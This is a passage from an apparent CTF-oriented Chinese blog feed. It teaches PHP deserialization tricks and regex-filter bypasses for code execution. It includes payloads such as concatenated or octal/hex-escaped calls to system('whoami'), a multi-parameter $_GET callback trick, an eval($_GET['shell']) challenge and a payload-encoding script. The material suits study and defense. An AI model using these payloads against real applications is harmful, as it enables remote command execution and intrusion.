&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行 <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 <code>666</code> <br> 而把对象属性个数的值增大执行 <code>unserialize('O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 abc</p><h4 id="绕过部分正则"><a class="markdownIt-Anchor" href="#绕过部分正则">#</a> 绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p><ul><li>利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）</li><li>serialize (array (a));//a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="利用引用"><a class="markdownIt-Anchor" href="#利用引用">#</a> 利用引用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p>上面这个例子将 <code>$b</code>  设置为 <code>$a</code>  的引用，可以使 <code>$a</code>  永远与 <code>$b</code>  相等</p><h4 id="16进制绕过字符的过滤"><a class="markdownIt-Anchor" href="#16进制绕过字符的过滤">#</a> 16 进制绕过字符的过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><p>这里给出一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h4 id="php反序列化字符逃逸"><a class="markdownIt-Anchor" href="#php反序列化字符逃逸">#</a> PHP 反序列化字符逃逸</h4><h5 id="情况1过滤后字符变多"><a class="markdownIt-Anchor" href="#情况1过滤后字符变多">#</a> 情况 1：过滤后字符变多</h5><p>首先给出本地的 php 代码，很简单不做过多的解释，就是把反序列化后的一个 x 替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则绕过</title>
      <link href="/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="代码执行函数"><a class="markdownIt-Anchor" href="#代码执行函数">#</a> <strong>代码执行函数</strong></h2><p>首先</p><p><strong>eval()</strong></p><p>最常见的代码执行函数 把字符串 code 作为 PHP 代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><p>检测一个断言是否为 <strong>false</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p><code>assert()</code>  会检查指定的 <code>assertion</code>  并在结果为 <code>false</code>  时采取适当的行动。在 <code>PHP5</code>  或 <code>PHP7</code>  中，如果 <code>assertion</code>  是字符串，它将会被 <code>assert()</code>  当做 <code>PHP</code>  代码来执行。</p><p><strong>preg_replace()+/e</strong></p><p>执行一个正则表达式的搜索和替换（一般用来）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索 <code>subject</code>  中匹配 <code>pattern</code>  的部分，以 <code>replacement</code>  进行替换。如果 <code>pattern</code>  的模式修饰符使用 <code>/e</code> ，那么当 <code>subject</code>  被匹配成功时， <code>replacement</code>  会被当做 PHP 代码执行</p><blockquote><p><strong>PS：  <code>preg_replace()+</code>  函数的 <code>/e</code>  修饰符在 <code>PHP7</code>  中被移除</strong></p></blockquote><p><strong>create_function()</strong></p><p>创建一个匿名 (lambda 样式) 函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造 payload 传递给 <code>create_function()</code>  对 <code>参数或函数体</code> <br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102205746960.png?raw=true" alt="在这里插入图片描述"></p><h2 id="可回调函数"><a class="markdownIt-Anchor" href="#可回调函数">#</a> <strong>可回调函数</strong></h2><p><strong>array_map()</strong></p><p>为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array</span> , <span class="keyword">array</span> ...<span class="variable">$arrays</span> ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array</code>  每个元素应用 <code>callback</code>  函数之后的数组。  <code>array_map()</code>  返回一个 <code>array</code> ，数组内容为 <code>array1</code>  的元素按索引顺序为参数调用 <code>callback</code>  后的结果（有更多数组时，还会传入 <code>arrays</code>  的元素）。  <code>callback</code>  函数形参的数量必须匹配 <code>array_map()</code>  实参中数组的数量。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021010221241094.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func()</strong></p><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102215723117.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func_array()</strong></p><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>把第一个参数作为回调函数 <code>callback</code>  调用，把参数数组作 <code>param_arr</code>  为回调函数的的参数传入。跟 <code>array_map()</code>  相似</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220152139.png?raw=true" alt="在这里插入图片描述"></p><p><strong>array_filter()</strong></p><p>用回调函数过滤数组中的单元</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>依次将 <code>array</code>  数组中的每个值传递到 <code>callback</code>  函数。如果 <code>callback</code>  函数返回 <code>true</code> ，则 <code>array</code>  数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220700697.png?raw=true" alt="在这里插入图片描述"></p><p><strong>usort()</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span> ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>当 <code>PHP &lt; 5.6</code>  时</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103123448401.png?raw=true" alt="在这里插入图片描述"></p><p>当 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时，php 有一个 <code>参数变长</code> 特性</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103205857483.png?raw=true" alt="在这里插入图片描述"></p><h2 id="字符串拼接绕过"><a class="markdownIt-Anchor" href="#字符串拼接绕过">#</a> <strong>字符串拼接绕过</strong></h2><p>字符串拼接绕过适用于过滤具体关键字的限制</p><p>使用 PHP &gt;=7</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103225920322.png?raw=true" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><blockquote><p>在 PHP 中不一定需要 <code>引号(单引号/双引号)</code>  来表示字符串。PHP 支持我们声明元素的类型，比如 <code>$name = (string)mochu7;</code> ，在这种情况下， <code>$name</code>  就包含字符串 <code>&quot;mochu7&quot;</code> ，此外，如果不显示声明类型，那么 PHP 会将 <code>圆括号内的数据当成字符串</code> 来处理</p></blockquote><h2 id="字符串转义绕过"><a class="markdownIt-Anchor" href="#字符串转义绕过">#</a> <strong>字符串转义绕过</strong></h2><p>适用版本 PHP&gt;=7</p><p>以八进制表示的 <code>\[0–7]&#123;1,3&#125;</code>  转义字符会自动适配 byte（如 <code>&quot;\400&quot; == “\000”</code> ）<br>以十六进制的 <code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>  转义字符表示法（如 <code>“\x41&quot;</code> ）<br>以 Unicode 表示的 <code>\u&#123;[0–9A-Fa-f]+&#125;</code>  字符，会输出为 UTF-8 字符串</p><p>payload 处理脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">hex_payload(payload)</span><br><span class="line">oct_payload(payload)</span><br><span class="line">uni_payload(payload)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;</span>();<span class="comment">#phpinfo();</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;</span>(<span class="string">&#x27;id&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104173537720.png?raw=true" alt="在这里插入图片描述"></p><p>另外，八进制的方法可以绕过 <code>无字母传参</code> 进行代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104180029425.png?raw=true" alt="在这里插入图片描述"></p><h2 id="多次传参绕过"><a class="markdownIt-Anchor" href="#多次传参绕过">#</a> <strong>多次传参绕过</strong></h2><p>如果过滤了 <code>引号(单引号/双引号)</code> ，可以通过以下方法绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104185804485.png?raw=true" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="number">1</span>=system&amp;<span class="number">2</span>=whoami</span><br><span class="line">POST:</span><br><span class="line">cmd=<span class="variable">$_GET</span>[<span class="number">1</span>](<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>如果 <code>PHP版本大于7</code>  这里还可以用拼接的方法绕过过滤引号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(sy.st.em)(whoami);</span><br></pre></td></tr></table></figure><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104203723764.png?raw=true" alt="在这里插入图片描述"></p><p>回调函数可能大部分看限制的具体长度，但是在 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时对以上过滤方法可以绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104211408314.png?raw=true" alt="在这里插入图片描述"></p><h2 id="内置函数访问绕过"><a class="markdownIt-Anchor" href="#内置函数访问绕过">#</a> 内置函数访问绕过</h2><p><code>get_defined_functions()</code> ：返回所有已定义函数的数组</p><p>利用这种方法首先还需要知道 PHP 的具体版本，因为每个版本的 <code>get_defined_functions()</code>  返回的值都是不一样的，这里以 <code>php7.4.3</code>  为准</p><p><img src="https://img-blog.csdnimg.cn/20210104224616126.png" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225436558.png?raw=true" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225532878.png?raw=true" alt="在这里插入图片描述"></p><h2 id="异或过滤"><a class="markdownIt-Anchor" href="#异或过滤">#</a> <strong>异或过滤</strong></h2><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或  <code>?</code>  和  <code>~</code>  之后得到的是  <code>A</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了 <code>所有英文字母和数字</code> ，但是我们知道 ASCII 码中还有很多 <code>字母数字之外的字符</code> 